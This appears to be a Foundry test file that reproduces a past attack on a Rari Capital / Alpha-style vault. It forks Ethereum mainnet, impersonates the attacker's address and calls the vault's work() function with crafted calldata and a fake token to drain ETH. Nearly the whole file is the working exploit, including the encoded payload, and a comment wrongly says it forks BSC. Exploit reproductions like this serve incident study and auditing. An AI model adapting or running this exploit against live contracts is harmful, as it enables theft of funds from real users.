// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    Attack tx: https://etherscan.com/tx/0x171072422efb5cd461546bfe986017d9b5aa427ff1c07ebe8acc064b13a7b7be
    Tenderly.co: https://dashboard.tenderly.co/tx/mainnet/0x171072422efb5cd461546bfe986017d9b5aa427ff1c07ebe8acc064b13a7b7be/
    Debug transaction: https://phalcon.blocksec.com/tx/eth/0x171072422efb5cd461546bfe986017d9b5aa427ff1c07ebe8acc064b13a7b7be
    
    run: forge test --contracts ./src/test/RariCapital_exp.sol -vvv  */
interface Bank {
    function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data) external payable;
}

contract ContractTest is Test {
    Bank vault = Bank(0x67B66C99D3Eb37Fa76Aa3Ed1ff33E8e39F0b9c7A);
    IERC20 fakeToken = IERC20(payable(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46));
    address attacker = address(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 12_394_009); //fork bsc at block 12394009
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] ETH Balance of attacker", attacker.balance, 18);

        bytes memory data =
            hex"00000000000000000000000081796c4602b82054a727527cd16119807b8c7608000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000600000000000000000000000002f755e8980f0c2e81681d82cccd1a4bd5b4d5d4600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

        cheats.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);
        (bool success, bytes memory result) = address(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46).call{
            value: 1_031_000_000_000_000_000_000
        }(abi.encodeWithSignature("donate()"));

        vault.work{value: 100_000_000}(
            0, 0x9EED7274Ea4b614ACC217e46727d377f7e6F9b24, 0, 100_000_000_000_000_000_000_000, data
        );

        emit log_named_decimal_uint("[End] ETH Balance of attacker", attacker.balance, 18);
    }
}
